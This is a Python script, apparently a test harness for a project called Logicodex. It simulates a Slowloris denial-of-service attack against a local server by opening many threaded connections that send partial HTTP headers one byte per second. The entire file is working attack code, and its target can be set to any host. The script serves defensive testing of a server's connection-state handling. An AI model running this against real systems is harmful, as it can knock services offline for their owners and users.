#!/usr/bin/env python3
"""
Logicodex v1.45 — Layer 4: Slowloris Attack Simulator

Tests the Taint FSM under slow partial-read conditions.
Expected: Connection transitions Healthy→Suspicious→Closing.

Usage: python3 slowloris.py --target 127.0.0.1:9999 --connections 100 --duration 60
       python3 slowloris.py --dry-run  # Verify script without network
"""

import argparse
import socket
import sys
import time
from threading import Thread

def slowloris_worker(target: str, duration: int):
    """Send partial HTTP headers very slowly."""
    host, port = target.rsplit(":", 1)
    port = int(port)
    end = time.time() + duration

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((host, port))

        # Send partial request byte by byte
        partial = b"GET / HTTP/1.1\r\nHost: "
        for byte in partial:
            if time.time() > end:
                break
            sock.send(bytes([byte]))
            time.sleep(1)  # 1 byte per second = very slow

        sock.close()
    except (socket.timeout, ConnectionRefusedError, BrokenPipeError):
        pass  # Expected — server may close suspicious connection

def main():
    parser = argparse.ArgumentParser(description="Slowloris attack simulator")
    parser.add_argument("--target", default="127.0.0.1:9999")
    parser.add_argument("--connections", type=int, default=100)
    parser.add_argument("--duration", type=int, default=60)
    parser.add_argument("--dry-run", action="store_true")
    args = parser.parse_args()

    if args.dry_run:
        print("[slowloris] DRY RUN — Script valid, no network activity")
        print(f"  Would target: {args.target}")
        print(f"  Would spawn: {args.connections} slow connections")
        print(f"  Would run for: {args.duration}s")
        print("  Expected: Taint FSM Healthy→Suspicious→Closing")
        return 0

    print(f"[slowloris] Attacking {args.target} with {args.connections} slow connections...")

    threads = []
    for i in range(args.connections):
        t = Thread(target=slowloris_worker, args=(args.target, args.duration))
        t.daemon = True
        t.start()
        threads.append(t)
        time.sleep(0.05)  # Stagger starts

    time.sleep(args.duration)
    print("[slowloris] Complete — Check server logs for Taint FSM transitions")
    return 0

if __name__ == "__main__":
    sys.exit(main())
